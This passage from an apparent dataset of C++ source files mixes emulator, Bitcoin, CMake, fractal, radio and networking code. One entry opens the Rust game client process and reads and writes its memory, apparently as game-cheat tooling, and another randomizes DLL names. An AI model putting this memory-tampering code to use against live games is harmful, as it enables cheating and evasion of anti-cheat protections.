NULL);\n\t\n\tstd::string message(messageBuffer, size);\n\tLocalFree(messageBuffer);\n\treturn message;\n}\n\nstd::string util::ShuffleDllName(const std::string& path)\n{\n\tsize_t lastSlash = path.find_last_of(\"\\\\\");\n\tsize_t lastDot = path.find_last_of(\".\");\n\n\tif (lastSlash == std::string::npos || lastDot == std::string::npos || lastDot <= lastSlash)\n\t\treturn path;\n\n\tstd::string directory = path.substr(0, lastSlash + 1);\n\tstd::string filename = path.substr(lastSlash + 1, lastDot - lastSlash - 1);\n\tstd::string extension = path.substr(lastDot);\n\n\tstd::random_device rd;\n\tstd::mt19937 g(rd());\n\tstd::shuffle(filename.begin(), filename.end(), g);\n\n\treturn directory + filename + extension;\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\r\n   recognize the extension without flags.  Borland does not know .cxx for\r\n   example.  */\r\n#ifndef __cplusplus\r\n# error \"A C compiler has been selected for C++.\"\r\n#endif\r\n\r\n#if !defined(__has_include)\r\n/* If the compiler does not have __has_include, pretend the answer is\r\n   always no.  */\r\n#  define __has_include(x) 0\r\n#endif\r\n\r\n\r\n/* Version number components: V=Version, R=Revision, P=Patch\r\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\r\n\r\n#if defined(__COMO__)\r\n# define COMPILER_ID \"Comeau\"\r\n  /* __COMO_VERSION__ = VRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\r\n\r\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\r\n# define COMPILER_ID \"Intel\"\r\n# if defined(_MSC_VER)\r\n#  define SIMULATE_ID \"MSVC\"\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_ID \"GNU\"\r\n# endif\r\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\r\n     except that a few beta releases use the old format with V=2021.  */\r\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\r\n#  if defined(__INTEL_COMPILER_UPDATE)\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\r\n#  else\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\r\n#  endif\r\n# else\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\r\n   /* The third version component from --version is an update index,\r\n      but no macro is provided for it.  */\r\n#  define COMPILER_VERSION_PATCH DEC(0)\r\n# endif\r\n# if defined(__INTEL_COMPILER_BUILD_DATE)\r\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\r\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\r\n# endif\r\n# if defined(_MSC_VER)\r\n   /* _MSC_VER = VVRR */\r\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n# elif defined(__GNUG__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n# endif\r\n# if defined(__GNUC_MINOR__)\r\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n# endif\r\n# if defined(__GNUC_PATCHLEVEL__)\r\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\r\n# define COMPILER_ID \"IntelLLVM\"\r\n#if defined(_MSC_VER)\r\n# define SIMULATE_ID \"MSVC\"\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_ID \"GNU\"\r\n#endif\r\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\r\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\r\n * VVVV is no smaller than the current year when a version is released.\r\n */\r\n#if __INTEL_LLVM_COMPILER < 1000000L\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\r\n#else\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\r\n#endif\r\n#if defined(_MSC_VER)\r\n  /* _MSC_VER = VVRR */\r\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n#elif defined(__GNUG__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n#endif\r\n#if defined(__GNUC_MINOR__)\r\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n#endif\r\n#if defined(__GNUC_PATCHLEVEL__)\r\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n#endif\r\n\r\n#elif defined(__PATHCC__)\r\n# define COMPILER_ID \"PathScale\"\r\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\r\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\r\n# if defined(__PATHCC_PATCHLEVEL__)\r\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\r\n# define COMPILER_ID \"Embarcadero\"\r\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\r\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\r\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\r\n\r\n#elif defined(__BORLANDC__)\r\n# define COMPILER_ID \"Borland\"\r\n  /* __BORLANDC__ = 0xVRR */\r\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\r\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\r\n\r\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\r\n# define COMPILER_ID \"Watcom\"\r\n   /* __WATCOMC__ = VVRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\r\n# if (__WATCOMC__ % 10) > 0\r\n#  define C",
    "// SPDX-FileCopyrightText: Copyright 2022 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-3.0-or-later\n\n#include \"hid_core/irsensor/processor_base.h\"\n\nnamespace Service::IRS {\n\nProcessorBase::ProcessorBase() {}\nProcessorBase::~ProcessorBase() = default;\n\nbool ProcessorBase::IsProcessorActive() const {\n    return is_active;\n}\n\nstd::size_t ProcessorBase::GetDataSize(Core::IrSensor::ImageTransferProcessorFormat format) const {\n    switch (format) {\n    case Core::IrSensor::ImageTransferProcessorFormat::Size320x240:\n        return 320 * 240;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size160x120:\n        return 160 * 120;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size80x60:\n        return 80 * 60;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size40x30:\n        return 40 * 30;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size20x15:\n        return 20 * 15;\n    default:\n        return 0;\n    }\n}\n\nstd::size_t ProcessorBase::GetDataWidth(Core::IrSensor::ImageTransferProcessorFormat format) const {\n    switch (format) {\n    case Core::IrSensor::ImageTransferProcessorFormat::Size320x240:\n        return 320;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size160x120:\n        return 160;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size80x60:\n        return 80;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size40x30:\n        return 40;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size20x15:\n        return 20;\n    default:\n        return 0;\n    }\n}\n\nstd::size_t ProcessorBase::GetDataHeight(\n    Core::IrSensor::ImageTransferProcessorFormat format) const {\n    switch (format) {\n    case Core::IrSensor::ImageTransferProcessorFormat::Size320x240:\n        return 240;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size160x120:\n        return 120;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size80x60:\n        return 60;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size40x30:\n        return 30;\n    case Core::IrSensor::ImageTransferProcessorFormat::Size20x15:\n        return 15;\n    default:\n        return 0;\n    }\n}\n\n} // namespace Service::IRS\n",
    "// Copyright (c) 2011-2014 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <qt/csvmodelwriter.h>\n\n#include <QAbstractItemModel>\n#include <QFile>\n#include <QTextStream>\n\nCSVModelWriter::CSVModelWriter(const QString &_filename, QObject *parent) :\n    QObject(parent),\n    filename(_filename), model(0)\n{\n}\n\nvoid CSVModelWriter::setModel(const QAbstractItemModel *_model)\n{\n    this->model = _model;\n}\n\nvoid CSVModelWriter::addColumn(const QString &title, int column, int role)\n{\n    Column col;\n    col.title = title;\n    col.column = column;\n    col.role = role;\n\n    columns.append(col);\n}\n\nstatic void writeValue(QTextStream &f, const QString &value)\n{\n    QString escaped = value;\n    escaped.replace('\"', \"\\\"\\\"\");\n    f << \"\\\"\" << escaped << \"\\\"\";\n}\n\nstatic void writeSep(QTextStream &f)\n{\n    f << \",\";\n}\n\nstatic void writeNewline(QTextStream &f)\n{\n    f << \"\\n\";\n}\n\nbool CSVModelWriter::write()\n{\n    QFile file(filename);\n    if(!file.open(QIODevice::WriteOnly | QIODevice::Text))\n        return false;\n    QTextStream out(&file);\n\n    int numRows = 0;\n    if(model)\n    {\n        numRows = model->rowCount();\n    }\n\n    // Header row\n    for(int i=0; i<columns.size(); ++i)\n    {\n        if(i!=0)\n        {\n            writeSep(out);\n        }\n        writeValue(out, columns[i].title);\n    }\n    writeNewline(out);\n\n    // Data rows\n    for(int j=0; j<numRows; ++j)\n    {\n        for(int i=0; i<columns.size(); ++i)\n        {\n            if(i!=0)\n            {\n                writeSep(out);\n            }\n            QVariant data = model->index(j, columns[i].column).data(columns[i].role);\n            writeValue(out, data.toString());\n        }\n        writeNewline(out);\n    }\n\n    file.close();\n\n    return file.error() == QFile::NoError;\n}\n",
    "#include \"plugin.h\"\n#include \"CRunningScript.h\"\n#include \"CTheScripts.h\"\n#include \"CMessages.h\"\n//#include \"ScmExtenderAPI.h\"\n\nclass ScmExtender {\npublic: \n    static inline std::unordered_map<int32_t, int8_t(*)(int32_t*)> mapOfNewOpcodes = {};\n\n    static __declspec(dllexport) void AddOneCommand(int32_t command, int8_t(*func)(int32_t*)) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end())\n            std::cout << \"[SCRIPT] Command id \" << command << \" overwritten\" << std::endl;\n\n        mapOfNewOpcodes[command] = func;\n    }\n\n    static inline CRunningScript* currentScript = nullptr;\n    static __declspec(dllexport) void CollectParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->CollectParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void StoreParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->StoreParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void UpdateCompareFlag(uint8_t flag) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->UpdateCompareFlag(flag);\n    }\n\n    static int8_t ProcessOneCommand(CRunningScript* script) {\n        ++CTheScripts::CommandsExecuted;\n\n        int32_t m_nPrevIp = script->m_nIp;\n        int32_t command = CTheScripts::ScriptSpace[script->m_nIp + 1] << 8 | CTheScripts::ScriptSpace[script->m_nIp];\n        script->m_nIp += sizeof(uint16_t);\n        script->m_bNotFlag = (command & 0x8000);\n        command &= 0x7FFF;\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end()) {\n            currentScript = script;\n            tScriptParam* params = CTheScripts::ScriptParams;\n            return f->second((int32_t*)params);\n        }\n\n        script->m_nIp = m_nPrevIp;\n        --CTheScripts::CommandsExecuted;\n\n        return script->ProcessOneCommand();\n    }\n\n    ScmExtender() {\n        plugin::Events::initRwEvent += []() {\n            CTheScripts::ScriptSpace = plugin::patch::Get<uint8_t*>(0x4387A0 + 3);\n        };\n\n        auto processScriptHook = [](CRunningScript* script, void*) {\n            if (script->m_bUseMissionCleanup)\n                script->DoDeathArrestCheck();\n\n            if (script->m_bIsMission && CTheScripts::FailCurrentMission == 1 && script->m_nSP == 1)\n                script->m_nIp = script->m_anStack[--script->m_nSP];\n\n            if (CTimer::m_snTimeInMilliseconds >= script->m_nWakeTime) {\n                while (!ProcessOneCommand(script)) {\n                }\n            }\n\n            if (!script->m_bAwake)\n                return;\n\n            if (!(CPad::GetPad(0)->NewState.ButtonCross && !CPad::GetPad(0)->OldState.ButtonCross))\n                return;\n\n            script->m_nWakeTime = 0;\n\n            for (int i = 0; i < 6; i++) {\n                if (CMessages::BIGMessages[i].m_Stack[0].m_pText != nullptr)\n                    CMessages::BIGMessages[i].m_Stack[0].m_nStartTime = 0;\n            }\n\n            if (CMessages::BriefMessages[0].m_pText != nullptr)\n                CMessages::BriefMessages[0].m_nStartTime = 0;\n        };\n        plugin::patch::RedirectCall(0x4393DF, LAMBDA(void, __fastcall, processScriptHook, CRunningScript*, void*));\n    }\n} scmExtender;\n",
    "#pragma once\n\n// Dumped with Dumper-7!\n\n\n#include \"../SDK.hpp\"\n\nnamespace SDK\n{\n//---------------------------------------------------------------------------------------------------------------------\n// FUNCTIONS\n//---------------------------------------------------------------------------------------------------------------------\n\n\n// BlueprintGeneratedClass CurieExecution_Water.CurieExecution_Water_C\n// (None)\n\nclass UClass* UCurieExecution_Water_C::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"CurieExecution_Water_C\");\n\n\treturn Clss;\n}\n\n\n// CurieExecution_Water_C CurieExecution_Water.Default__CurieExecution_Water_C\n// (Public, ClassDefaultObject, ArchetypeObject, WasLoaded, LoadCompleted)\n\nclass UCurieExecution_Water_C* UCurieExecution_Water_C::GetDefaultObj()\n{\n\tstatic class UCurieExecution_Water_C* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<UCurieExecution_Water_C*>(UCurieExecution_Water_C::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n}\n\n\n",
    "#include <Windows.h>\n#include <winternl.h>\n#include <Psapi.h>\n\n#ifdef _DEBUG\n#include \"usermode.h\"\nbool p9::memory::setup( ) {\n\tHANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, NULL );\n\tif ( ss ) {\n\t\tHANDLE process = NULL;\n\t\tPROCESSENTRY32 pe;\n\t\tpe.dwSize = sizeof( PROCESSENTRY32 );\n\t\tif ( Process32First( ss, &pe ) ) {\n\t\t\tdo {\n\t\t\t\tif ( !wcscmp( pe.szExeFile, ( L\"RustClient.exe\" ) ) ) {\n\t\t\t\t\tprocess = OpenProcess( PROCESS_ALL_ACCESS, false, pe.th32ProcessID );\n\t\t\t\t}\n\t\t\t} while ( Process32Next( ss, &pe ) );\n\t\t}\n\t\tCloseHandle( ss );\n\t\tprocess_handle = process;\n\t}\n\treturn process_handle;\n}\n\nvoid p9::memory::read( uintptr_t address, void* buffer, size_t size ) {\n\tif ( process_handle )\n\t\tReadProcessMemory( process_handle, ( LPCVOID )address, buffer, size, 0 );\n}\n\nvoid p9::memory::write( uintptr_t address, void* buffer, size_t size ) {\n\tif ( process_handle )\n\t\tWriteProcessMemory( process_handle, ( LPVOID )address, &buffer, size, NULL );\n}\n\np9::memory::module_t p9::memory::get_module( const std::wstring& name ) {\n\n\tmodule_t mod = { 0 };\n\tHANDLE ss = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, GetProcessId( process_handle ) );\n\tif ( ss ) {\n\t\tMODULEENTRY32 me;\n\t\tme.dwSize = sizeof( MODULEENTRY32 );\n\t\tif ( Module32First( ss, &me ) ) {\n\t\t\tdo {\n\t\t\t\tif ( !wcscmp( me.szModule, name.data( ) ) ) {\n\t\t\t\t\tmod.base = ( uint64_t )me.modBaseAddr;\n\t\t\t\t\tmod.size = ( uint64_t )me.modBaseSize;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t} while ( Module32Next( ss, &me ) );\n\t\t}\n\t\tCloseHandle( ss );\n\t}\n\treturn mod;\n}\n#endif // _DEBUG",
    "#include <fmt/core.h>\n#include <gnuradio-4.0/Graph.hpp>\n#include <gnuradio-4.0/Scheduler.hpp>\n#include <gnuradio-4.0/packet-modem/burst_shaper.hpp>\n#include <gnuradio-4.0/packet-modem/vector_sink.hpp>\n#include <gnuradio-4.0/packet-modem/vector_source.hpp>\n#include <pmtv/pmt.hpp>\n#include <boost/ut.hpp>\n#include <complex>\n#include <numeric>\n\nint main()\n{\n    using namespace boost::ut;\n    using c64 = std::complex<float>;\n\n    gr::Graph fg;\n\n    const std::vector<c64> v(30, { 1.0f, -1.0f });\n    const std::vector<gr::Tag> tags = { { 0, { { \"packet_len\", 10 } } },\n                                        { 10, { { \"packet_len\", 20 } } } };\n    auto& source = fg.emplaceBlock<gr::packet_modem::VectorSource<c64>>(v, false, tags);\n\n    const std::vector<float> leading_shape = { 0.2f, 0.4f, 0.6f, 0.8f, 0.9f };\n    const std::vector<float> trailing_shape = { 0.8f, 0.5f, 0.1f };\n    auto& shaper = fg.emplaceBlock<gr::packet_modem::BurstShaper<c64, c64, float>>(\n        leading_shape, trailing_shape);\n\n    auto& sink = fg.emplaceBlock<gr::packet_modem::VectorSink<c64>>();\n    expect(eq(gr::ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(shaper)));\n    expect(eq(gr::ConnectionResult::SUCCESS, fg.connect<\"out\">(shaper).to<\"in\">(sink)));\n\n    gr::scheduler::Simple sched{ std::move(fg) };\n    expect(sched.runAndWait().has_value());\n\n    const auto data = sink.data();\n    std::print(\"vector sink contains {} items\\n\", data.size());\n    std::print(\"vector sink items:\\n\");\n    for (const auto n : data) {\n        fmt::print(\"{} \", n);\n    }\n    std::print(\"\\n\");\n    std::print(\"vector sink tags:\\n\");\n    const auto sink_tags = sink.tags();\n    for (const auto& t : sink_tags) {\n        fmt::print(\"index = {}, map = {}\\n\", t.index, t.map);\n    }\n\n    return 0;\n}\n",
    "\ufeff#include <SFML/Graphics.hpp>\r\n#include <ccomplex>\r\n#include <iostream>\r\n#include <string>\r\n#include <Windows.h>\r\n#include <atlstr.h>\r\n#include <random>\r\n\r\n\r\n\r\n\r\n\r\nusing namespace sf;\r\n\r\nstd::complex<double> mandelbrot(std::complex<double> z, std::complex<double> c)\r\n{\r\n    \r\n    std::complex<double> z1(0, 0);\r\n    z1 = z * z + c;\r\n\r\n\r\n\r\n    return z1;\r\n}\r\n\r\n\r\nint IsM(std::complex<double> c, int mx)\r\n{\r\n    std::complex<double> z(0, 0);\r\n\r\n    for (std::int16_t i = 0; i < mx; i++)\r\n    {\r\n        z = mandelbrot(z, c);\r\n\r\n        if (abs(z) >= 2)\r\n        {\r\n            return (int)(i * 255 / mx);\r\n        }\r\n    }\r\n\r\n    return 255;\r\n}\r\n\r\nint IsJ(std::complex<double> z, int mx, std::complex<double> c)\r\n{\r\n    std::complex<double> f(-0.7514f, -0.826f);\r\n    //std::complex<double> z(0, 0);\r\n\r\n    for (std::int16_t i = 0; i < mx; i++)\r\n    {\r\n        z = mandelbrot(z, c);\r\n\r\n        if (abs(z) >= 2)\r\n        {\r\n            return (int)(i * 255 / mx);\r\n        }\r\n    }\r\n\r\n    return 255;\r\n}\r\n\r\nvoid update(int WIDTH, int HEIGHT, double ofX, double ofY, RenderWindow& window, RectangleShape shape, double scale, int maxIt, int Fnum, std::complex<double> cForJ)\r\n{\r\n\r\n    window.clear();\r\n    \r\n    for (double i = 0; i <= WIDTH; i++)\r\n    {\r\n        for (double j = 0; j <= HEIGHT; j++)\r\n        {\r\n            double x = (i - WIDTH / 2 + ofX) * scale;\r\n            double y = (j - HEIGHT / 2 + ofY) * scale;\r\n\r\n            y = -y;\r\n            if (Fnum==0)\r\n            {\r\n                Uint8 clr = IsM(std::complex<double>(x, y), maxIt);\r\n                auto color = sf::Color{ clr, clr, clr };\r\n                shape.setFillColor(color);\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }\r\n            else if(Fnum == 1)\r\n            {\r\n                Uint8 clr = IsJ(std::complex<double>(x, y), maxIt, cForJ);\r\n                auto color = sf::Color{ clr, clr, clr };\r\n                shape.setFillColor(color);\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }\r\n\r\n\r\n            \r\n            /*if (IsM(std::complex<double>(x, y), 100))\r\n            {\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }*/\r\n        }\r\n    }\r\n\r\n\r\n    window.display();\r\n}\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"Russian\");\r\n    int MaxIt = 50;\r\n    bool start = true;\r\n    int m = 0;\r\n    \r\n    std::complex<double> cForJ(-0.64, 0.39);\r\n    if (start)\r\n    {\r\n        std::cout << \"\u0413\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440 \u0444\u0440\u0430\u043a\u0442\u0430\u043b\u043e\u0432\\n\";\r\n        std::cout << \"\u041c\u0430\u043a\u0441\u0438\u043c\u0443\u043c \u0438\u0442\u0435\u0440\u0430\u0446\u0438\u0439 (\u043c\u0435\u043d\u044c\u0448\u0435 - \u043b\u0443\u0447\u0448\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c, \u043d\u043e \u0445\u0443\u0436\u0435 \u0442\u043e\u0447\u043d\u043e\u0441\u0442\u044c \u0438 \u044f\u0440\u0447\u0435 \u0433\u0440\u0430\u0434\u0438\u0435\u043d\u0442): \";\r\n        std::cin >> MaxIt;\r\n        std::cout << \"\u0414\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0435 \u0444\u0440\u0430\u043a\u0442\u0430\u043b\u044b:\\n\";\r\n        std::cout << \"\u041c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u041c\u043e\u043d\u0434\u0435\u043b\u044c\u0431\u0440\u043e\u0442\u0430: 0\\n\";\r\n        std::cout << \"\u041c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u0416\u044e\u043b\u0438\u0430: 1\\n\";\r\n        std::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e: \";\r\n        std::cin >> m;\r\n        std::cout << \"\u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435\\n\u0421\u0442\u0440\u0435\u043b\u043e\u0447\u043a\u0438: \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435\\n\u041b\u0435\u0432\u044b\u0439 Shift: \u0443\u0432\u0435\u043b\u0438\u0447\u0435\u043d\u0438\u0435\\n\u041b\u0435\u0432\u044b\u0439 Alt: \u0443\u043c\u0435\u043d\u044c\u0448\u0435\u043d\u0438\u0435\\nU: \u043e\u0431\u043d\u043e\u0432\u0438\u0442\u044c \u044d\u043a\u0440\u0430\u043d\\n\";\r\n        std::cout << \"\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u0441\u0434\u0435\u043b\u0430\u043d\u0430 \u0432 \u0440\u0430\u043c\u043a\u0430\u0445 \u043f\u0440\u043e\u0435\u043a\u0442\u043d\u043e\u0439 \u0434\u0435\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438\\n\u0428\u043a\u043e\u043b\u0430 \u21161580, 2024 \u0433.\";\r\n        \r\n        \r\n    }\r\n    std::complex<double> z(0, 0);\r\n    std::int32_t WIDTH = 200;\r\n    std::int32_t HEIGHT = 200;\r\n    double Y=0;\r\n    double X=0;\r\n\r\n    double ofX = 0;\r\n    double ofY = 0;\r\n    double scale = 0.01f;\r\n    RenderWindow window(VideoMode(WIDTH, HEIGHT), L\"\u0424\u0440\u0430\u043a\u0442\u0430\u043b\", Style::Default);\r\n    RenderWindow test(VideoMode(WIDTH, HEIGHT), L\"\u0412\u044b\u0431\u043e\u0440 \u0442\u043e\u0447\u043a\u0438\", Style::Titlebar);\r\n    \r\n    Vector2i pos = window.getPosition();\r\n    pos.x += WIDTH;\r\n\r\n    test.setPosition(pos);\r\n    \r\n    if (m!=1) \r\n    {\r\n        test.close();             \r\n    }\r\n    \r\n\r\n    window.setVerticalSyncEnabled(true);\r\n    \r\n\r\n    CircleShape sh;\r\n    sh.setScale({ 1.f,1.f });\r\n    sh.setRadius(0.5f);\r\n    sh.setFillColor(Color::Black);\r\n    \r\n    for (double i = 0; i <= WIDTH; i++)\r\n    {\r\n        for (double j = 0; j <= HEIGHT; j++)\r\n        {\r\n            double x = (i - WIDTH / 2)/50;\r\n            double y = (j - HEIGHT / 2)/50;\r\n\r\n            y = -y;\r\n            \r\n            Uint8 c = IsM(std::complex<double>(x,y),MaxIt)/2;\r\n            auto GREY = Color{c, c, c };\r\n            sh.setFillColor(GREY);\r\n            sh.setPosition(i, j);\r\n            test.draw(sh);\r\n            sh.setFillColor(Color::Black);\r\n            if (i == WIDTH/2 || j == HEIGHT/2)\r\n            {\r\n                sh.setFillColor(Color::White);\r\n                sh.setPosition(i, j);\r\n                test.draw(sh);\r\n                \r\n            }\r\n\r\n        }\r\n    }\r\n    test.display();\r\n\r\n\r\n    RectangleShape shape;\r\n    shape.setSize({ 1.f, 1.f });\r\n    shape.setFillColor(Color::White);\r\n\r\n    \r\n\r\n\r\n    update(WIDTH, HEIGHT, ofX, ofY, window, shape, scale, MaxIt, m, cForJ);\r\n    while (window.isOpen())\r\n    {\r\n        if (window.hasFocus())\r\n        {\r\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Left))\r\n            {\r\n                ofX -= 50;\r\n                update(W",
    "\ufeff#include \"pch.h\"\n#define _WINSOCK_DEPRECATED_NO_WARNINGS\n#include \"Winsock2.h\"\n#include <iostream>\n#include <string>\n#include <ctime>\n#include <chrono>\n#include \"Errors.h\"\n#pragma comment(lib, \"WS2_32.lib\")\nusing namespace std;\n\nstruct GETSINCHRO\n{\n\tDWORD64 mTime;\n};\n\nstruct SETSINCHRO\n{\n\t__int64 corrTime;\n};\n\nDWORD64 GetLocalUnixTime()\n{\n\treturn std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();\n}\n\nint main()\n{\n\tGetLocalUnixTime();\n\n\tstring IP;\n\tcout << \"Enter IP of local NTP-server: \";\n\tcin >> IP;\n\n\tWSADATA wsaData;\n\tif (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)\n\t\tthrow SetErrorMsgText(\"Startup: \", WSAGetLastError());\n\n\twhile (true) {\n\t\tint TC = 1000;\n\t\tint maxcorr = 0, mincorr = INT_MAX;\n\t\t__int64 mcorr = 0;\n\t\t__int64 mCcOs = 0;\n\n\t\tDWORD64 ClientTime = 0;\n\t\tSOCKET clientSocket;\n\t\tcout << \"Enter TC: \";\n\t\tcin >> TC;\n\n\t\ttry\n\t\t{\n\t\t\tif ((clientSocket = socket(AF_INET, SOCK_DGRAM, NULL)) == INVALID_SOCKET)\n\t\t\t\tthrow SetErrorMsgText(\"Socket: \", WSAGetLastError());\n\n\t\t\tSOCKADDR_IN serverParameters;\n\t\t\tserverParameters.sin_family = AF_INET;\n\t\t\tserverParameters.sin_port = htons(2000);\n\t\t\tserverParameters.sin_addr.s_addr = inet_addr(IP.c_str());\n\n\t\t\tGETSINCHRO gs;\n\t\t\tSETSINCHRO ss;\n\t\t\tss.corrTime = 0;\n\t\t\tgs.mTime = 0;\n\n\t\t\tsendto(clientSocket, (char*)&gs, sizeof(gs), 0, (sockaddr*)&serverParameters, sizeof(serverParameters));\n\t\t\tint lc = sizeof(serverParameters);\n\t\t\tif ((recvfrom(clientSocket, (char*)&ss, sizeof(ss), NULL, (sockaddr*)&serverParameters, &lc)) == SOCKET_ERROR)\n\t\t\t\tthrow SetErrorMsgText(\"Get time: \", WSAGetLastError());\n\t\t\tClientTime = ss.corrTime;\n\t\t\tcout << \" * Init sync:\" << ss.corrTime << endl << endl;\n\n\t\t\tfor (int i = 0; i < 10; 